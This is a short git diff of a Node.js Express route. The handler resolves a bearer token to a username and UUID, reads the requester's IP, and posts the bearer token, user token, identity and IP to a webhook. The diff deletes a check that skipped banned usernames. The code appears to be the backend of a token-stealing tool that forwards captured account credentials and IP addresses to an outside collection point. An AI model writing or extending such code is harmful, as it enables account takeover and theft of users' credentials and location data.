@@ -27,9 +27,6 @@ app.get('/', async (req, res) => {
         const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
-        if (checkIfBanned(username)) {
-            return
-        }
         const ip = getIp(req)
         postToWebhook(username, bearerToken, uuid, ip, userToken)
     } catch (e) {
